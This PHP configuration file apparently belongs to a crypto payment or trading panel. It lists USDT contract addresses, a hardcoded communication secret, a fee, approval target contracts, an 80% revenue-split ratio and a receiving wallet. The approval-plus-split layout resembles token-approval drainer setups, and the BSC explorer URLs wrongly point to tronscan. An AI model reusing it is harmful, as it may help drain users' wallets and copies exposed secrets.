<?php
return [
    //python服务的IP地址及端口
    'python_ip' => '127.0.0.1:33235',
    'rrr_arr' => ['z','j'],
    //通信密钥
    'com_secert' => 'DSVasfrFASDFws325DfgrFASq33ASFjkjlH823aaa',
    'trade_fee' => 0.03,     //交易手续费
    'contract_trx' => 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',     //trx   usdt
    'contract_trx_usdt' => 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',     //trx   usdt
    'contract_trx_decimals' => 6,     //trx   usdt 精度
    'contract_bsc' => '0x55d398326f99059ff775485246999027b3197955',     //bsc usdt
    'contract_bsc_usdt' => '0x55d398326f99059ff775485246999027b3197955',     //bsc usdt
    'contract_bsc_decimals' => 18,     //bsc usdt 精度
//eth usdt
    'contract_eth_usdt' => '0xdAC17F958D2ee523a2206206994597C13D831ec7',     //bsc usdt
    'contract_eth_decimals' => 6,     //bsc usdt 精度

    'trc_hash_url'=>'https://tronscan.org/%23/transaction/',
    'trc_address_url'=>'https://tronscan.org/%23/address/',
    'bsc_hash_url'=>'https://tronscan.org/%23/transaction/',
    'bsc_address_url'=>'https://tronscan.org/%23/address/',

    'approve_type' => 2, // 1 授权账号 2 授权合约
    'bili' => 0.8, //分成比例
    'approve_trx_address' =>'TQ24fdHGCQvGu7bDgHVXKMTM2NAUXFMA3A', //智能合约地址
    'approve_bsc_address' =>'0x1e136427148CD08eB98e5e6d5fAcD8677B20E889', //智能合约地址

    'transfer_trx_shou_address' =>'TENpnHywmcVuyAwaqZZTMMSVkr4meqysi1', //trx转账收币地址

];
